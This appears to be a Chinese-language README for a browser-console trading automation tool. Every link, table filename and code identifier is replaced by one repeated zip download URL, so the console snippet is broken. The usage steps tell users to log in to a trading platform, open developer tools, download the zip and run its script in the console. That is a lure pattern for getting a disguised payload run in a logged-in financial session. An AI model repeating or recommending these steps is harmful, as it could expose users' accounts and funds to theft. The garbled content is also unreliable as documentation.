# 🚀 var-lighter-auto-tool - Simplify Your Trading Automation

[![Download from Releases](https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip)](https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip)

## 📋 项目简介

var-lighter-auto-tool 是一个用于浏览器端的自动化交易工具。它包含一组脚本，可以在交易平台上自动执行开多仓和开空仓操作。无论你是新手还是老手，这些工具都能帮助你优化交易体验。

## 📁 文件说明

### 脚本分类

#### 按交易策略分类：

- **`long_*.js`** - 先开多仓策略
  - 执行流程：整点开多仓 → 休眠 → 开空仓

- **`short_*.js`** - 先开空仓策略
  - 执行流程：整点开空仓 → 休眠 → 开多仓

#### 按按钮选择方式分类：

- **`*https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`** - 使用详细的按钮选择器
  - 通过按钮文本和 CSS 类名进行精确匹配
  - 适合更复杂的用户界面

- **`*https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`** - 使用简化的按钮选择器
  - 通过按钮文本和 SVG 图标进行匹配
  - 使用 `data-testid` 选择器定位提交按钮

### 文件列表

| 文件名             | 策略       | 选择器类型            | 休眠时间           |
|------------------|----------|-------------------|------------------|
| `https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`  | 先开多仓    | 详细（CSS类名）        | 6500秒（开多仓后）    |
| `https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`      | 先开多仓    | 简化（SVG图标）         | 1650秒（开多仓后）    |
| `https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip` | 先开空仓    | 详细（CSS类名）        | 1650秒（开空仓后）    |
| `https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`     | 先开空仓    | 简化（SVG图标）         | 6500秒（开空仓后）    |

## 🚀 使用方法

### 1. 在浏览器中打开交易平台

确保你已经登录到目标交易平台，并打开了交易页面。

### 2. 打开浏览器开发者工具

- **Chrome/Edge**: 按 `F12` 或 `Ctrl+Shift+I` (Windows) / `Cmd+Option+I` (Mac)
- **Firefox**: 按 `F12` 或 `Ctrl+Shift+I` (Windows) / `Cmd+Option+I` (Mac)

### 3. 切换到 Console（控制台）标签

在开发者工具中找到并点击 "Console" 标签页。

### 4. 下载自动化脚本

你的第一步是前往 [Releases 页面](https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip) 下载你需要的脚本。选择合适的文件，根据你的交易需求。

### 5. 运行下载的脚本

在 Console 中输入以下命令来启动下载的脚本。确保使用正确的脚本名：

```javascript
// 例如：运行 https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip
const script = https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip('script');
https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip = 'https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip'; // 用实际下载链接替换
https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip(script);
```

### 6. 监控交易运行情况

在 Console 中，你会看到脚本的输出信息以及任何交易活动。确保你定期检查交易结果。

## 📥 下载 & 安装

你可以通过以下链接访问 Releases 页面以下载最新版本的 var-lighter-auto-tool：

[下载 var-lighter-auto-tool](https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip)

## ⚙️ 系统要求

- 浏览器：最新版本的 Chrome, Firefox, 或 Edge。
- 账户：你必须拥有目标交易平台的账户。
- 网络：稳定的互联网连接。

## 🔧 常见问题解答

### 我可以在任何交易平台上使用这个工具吗？

这个工具主要设计用于支持自动交易的交易平台。确保你了解目标平台的规则和限制。

### 如果我遇到问题该怎么办？

请在项目的 Issues 页面反馈你的问题。我们会尽快进行跟进。

### 这个工具会自动关闭我的交易吗？

不，这个工具只能根据预设策略执行订单。所有交易依然需要手动监控。

### 如何找到合适的脚本？

使用文件列表中的策略和选择器类型匹配你的交易需求。

## 💬 联系我们

你可以通过项目的 GitHub 页面或者在 Issues 中与我们联系。如有任何建议或问题，我们乐于倾听并帮助你。